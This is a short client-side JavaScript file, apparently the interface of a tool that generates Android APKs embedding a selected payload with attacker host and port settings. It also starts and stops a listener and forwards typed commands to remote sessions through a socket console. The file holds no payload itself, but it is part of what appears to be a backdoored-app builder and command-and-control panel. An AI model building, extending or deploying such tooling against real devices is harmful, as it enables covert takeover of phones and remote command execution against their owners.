const socket = io();

document.getElementById('apkForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const data = {
        payload: formData.get('payload'),
        lhost: formData.get('lhost'),
        lport: formData.get('lport'),
        apkName: formData.get('apkName')
    };

    const res = await fetch('/generate-apk', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
    const result = await res.json();
    alert(result.error || result.message);
});

document.getElementById('startServer').addEventListener('click', async () => {
    const data = {
        payload: document.querySelector('select[name="payload"]').value,
        lhost: document.querySelector('input[name="lhost"]').value,
        lport: document.querySelector('input[name="lport"]').value
    };

    const res = await fetch('/start-server', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
    const result = await res.json();
    alert(result.error || result.message);
});

document.getElementById('stopServer').addEventListener('click', async () => {
    const res = await fetch('/stop-server', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    });
    const result = await res.json();
    alert(result.error || result.message);
});

document.getElementById('runCommand').addEventListener('click', () => {
    const command = document.getElementById('command').value.trim();
    if (command) {
        socket.emit('run-command', command);
        document.getElementById('command').value = '';
    }
});

socket.on('console', (msg) => {
    const consoleArea = document.getElementById('console');
    consoleArea.value += `${msg}\n`;
    consoleArea.scrollTop = consoleArea.scrollHeight;
});
